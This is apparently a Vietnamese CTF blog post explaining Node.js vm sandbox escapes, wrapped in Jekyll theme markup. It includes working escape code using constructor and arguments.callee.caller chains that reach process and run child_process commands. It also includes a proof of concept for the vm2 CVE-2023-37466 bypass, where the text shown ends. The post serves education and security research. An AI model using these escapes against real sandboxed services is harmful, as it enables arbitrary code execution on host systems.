      this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }
          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();
      });
    } /* constructor() */

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isSysDarkPrefer() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get isLightMode() {
      return this.mode === ModeToggle.LIGHT_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }
        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }
      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    } /* flipMode() */
  } /* ModeToggle */

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>

  <!-- <style>
    body {
      background-image: url('/assets/background/background.jpg');
    }
    </style> -->

  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="https://pbs.twimg.com/profile_images/1771461862468579328/HqACG5Vs_400x400.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Yuu's blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">I will write some CTF writeup here :v</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/anzuukino"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/anzuukino"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    
    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>NodeJS escape VM and some gadgets chaining in NodeJS</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>NodeJS escape VM and some gadgets chaining in NodeJS</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1723392000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 11, 2024
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1723810771"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 16, 2024
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/anzuukino">Yuu</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3261 words"
>
  <em>18 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <h2 id="nodejs-escape-vm-and-some-gadgets-chaining-in-nodejs"><span class="me-2">NodeJS escape VM and some gadgets chaining in NodeJS</span><a href="#nodejs-escape-vm-and-some-gadgets-chaining-in-nodejs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="sandbox-là-gì"><span class="me-2">Sandbox là gì?</span><a href="#sandbox-là-gì" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính.</p>

<h3 id="escape-vm"><span class="me-2">Escape VM</span><a href="#escape-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>VM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chính</p>

<h3 id="module-vm"><span class="me-2">Module VM</span><a href="#module-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Sử dụng module <code class="language-plaintext highlighter-rouge">node:vm</code> (ngoài ra còn có <code class="language-plaintext highlighter-rouge">vm2</code> ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụ</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node:vm</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="p">{</span> <span class="na">x</span><span class="p">:</span> <span class="mi">2</span> <span class="p">};</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">createContext</span><span class="p">(</span><span class="nx">context</span><span class="p">);</span> <span class="c1">// tạo ngữ cảnh</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">x += 40; var y = 17;</span><span class="dl">'</span><span class="p">;</span>
<span class="c1">// `x` and `y` are global variables in the context.</span>
<span class="c1">// Initially, x has the value 2 because that is the value of context.x.</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">runInContext</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// 42</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span> <span class="c1">// 17</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span> 
<span class="c1">// 1; y is not defined. </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Có nghĩa là code chạy trong <code class="language-plaintext highlighter-rouge">context</code> sẽ không ảnh hưởng đến biến ngoài <code class="language-plaintext highlighter-rouge">context</code> và ngược lại</p>

<h3 id="an-insecure-javascript-sandbox"><span class="me-2">An insecure JavaScript sandbox</span><a href="#an-insecure-javascript-sandbox" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">vm.runInThisContext(code)</code>:
Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khác</li>
</ul>

<p><a href="/assets/escapevm/image.png" class="popup img-link  shimmer"><img src="/assets/escapevm/image.png" alt="alt text" loading="lazy"></a></p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">vm</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">globalobject</span> <span class="o">=</span> <span class="nx">process</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">vmResult</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">runInThisContext</span><span class="p">(</span><span class="dl">'</span><span class="s1">process</span><span class="dl">'</span><span class="p">);;</span>
<span class="k">if </span><span class="p">(</span><span class="nx">globalobject</span> <span class="o">===</span> <span class="nx">vmResult</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">VM is running in the global context</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">///VM is running in the global context</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">vm</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">localVar</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">di</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">vmResult</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">runInThisContext</span><span class="p">(</span><span class="dl">'</span><span class="s1">localVar = "box";</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">vmResult:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">vmResult</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">localVar:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">localVar</span><span class="p">);</span>
<span class="c1">// vmResult: 'box', localVar: 'di'</span>

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">vm.createContext([sandbox])</code>: Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong global</li>
</ul>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">vm</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">global</span><span class="p">.</span><span class="nx">test</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="na">test</span> <span class="p">:</span> <span class="mi">9</span><span class="p">};</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">runInContext</span><span class="p">(</span><span class="dl">'</span><span class="s1">test = test + 3</span><span class="dl">'</span><span class="p">,</span> <span class="nx">sandbox</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nb">global</span><span class="p">.</span><span class="nx">test</span><span class="p">);</span> <span class="c1">// 9</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span> <span class="c1">// { test: 12 }</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">Hàm vm.runInNewContext(code[, sandbox][, options])</code> là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm một</p>

<p><a href="/assets/escapevm/5.png" class="popup img-link  shimmer"><img src="/assets/escapevm/5.png" alt="alt text" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">vm.Script</code> là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox.</p>

<p><code class="language-plaintext highlighter-rouge">script</code> có thể được chạy thông qua <code class="language-plaintext highlighter-rouge">runInNewContext</code></p>

<p>Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng <code class="language-plaintext highlighter-rouge">process</code>. Một khi đã có được đối tượng <code class="language-plaintext highlighter-rouge">process</code>, chúng ta có thể sử dụng <code class="language-plaintext highlighter-rouge">require</code> để nhập <code class="language-plaintext highlighter-rouge">child_process</code> và sau đó dùng <code class="language-plaintext highlighter-rouge">child_process</code> để thực thi các lệnh hệ thống. Mặc dù đối tượng <code class="language-plaintext highlighter-rouge">process</code> được gắn vào <code class="language-plaintext highlighter-rouge">global</code>, khi tạo một ngữ cảnh mới (sử dụng <code class="language-plaintext highlighter-rouge">createContext</code>), đối tượng <code class="language-plaintext highlighter-rouge">global</code> không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng <code class="language-plaintext highlighter-rouge">process</code> từ <code class="language-plaintext highlighter-rouge">global</code> vào môi trường sandbox.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">test</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">runInNewContext</span><span class="p">(</span><span class="s2">`this.constructor.constructor('return process.env')()`</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>hoặc</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">vm</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="na">test</span> <span class="p">:</span> <span class="mi">1337</span><span class="p">};</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="nx">vm</span><span class="p">.</span><span class="nf">runInContext</span><span class="p">(</span><span class="s2">`test = this.constructor.constructor('return process.env')()`</span><span class="p">,</span> <span class="nx">sandbox</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên <code class="language-plaintext highlighter-rouge">this</code> trỏ đến <code class="language-plaintext highlighter-rouge">runInContext</code> ( hoặc <code class="language-plaintext highlighter-rouge">runInNewContext</code>), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được <code class="language-plaintext highlighter-rouge">Function</code> (cái này là của bên ngoài sandbox). Cuối cùng dựa vào <code class="language-plaintext highlighter-rouge">Function</code> mà ta vừa lấy được ta có thể lấy được <code class="language-plaintext highlighter-rouge">process</code></p>

<p>Nói một cách đơn giản, quá trình này ta chain các <code class="language-plaintext highlighter-rouge">gadget</code> để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandbox</p>

<p>Sau khi có process thì RCE là chuyện đơn giản</p>

<p><a href="/assets/escapevm/2.png" class="popup img-link  shimmer"><img src="/assets/escapevm/2.png" alt="alt text" loading="lazy"></a></p>

<p>Một số trường hợp khác</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">vm</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="s2">`(() =&gt; {
  const a = {};
  a.toString = function () {
    const cc = arguments.callee.caller;
    const p = (cc.constructor.constructor('return process'))();
    return p.mainModule.require('child_process').execSync('whoami').toString();
  };
  return a;
})()`</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">res</span><span class="p">);</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là <code class="language-plaintext highlighter-rouge">arguments.callee.caller</code>. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại.</p>

<p>Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính <code class="language-plaintext highlighter-rouge">arguments.callee.caller</code> sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox.</p>

<p><a href="/assets/escapevm/6.png" class="popup img-link  shimmer"><img src="/assets/escapevm/6.png" alt="alt text" loading="lazy"></a></p>

<p>Giải thích đơn giản</p>

<p>Tóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là <code class="language-plaintext highlighter-rouge">Function</code> và <code class="language-plaintext highlighter-rouge">arguments.callee.caller</code> và từ đó ta có thể làm bất cứ điều gì.</p>

<ul>
  <li>Ngoài <code class="language-plaintext highlighter-rouge">vm</code> ra thì còn một module khác là <code class="language-plaintext highlighter-rouge">vm2</code> được coi là “bản nâng cấp” của <code class="language-plaintext highlighter-rouge">vm</code>. <code class="language-plaintext highlighter-rouge">vm2</code> là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. <code class="language-plaintext highlighter-rouge">vm2</code> dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như <code class="language-plaintext highlighter-rouge">vm</code> thì <code class="language-plaintext highlighter-rouge">vm2</code> cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đây</li>
</ul>

<h3 id="cve-2023-37466"><span class="me-2">CVE-2023-37466</span><a href="#cve-2023-37466" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code.</p>

<p>POC</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) =&gt; x,
                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();
`</span><span class="p">;</span>

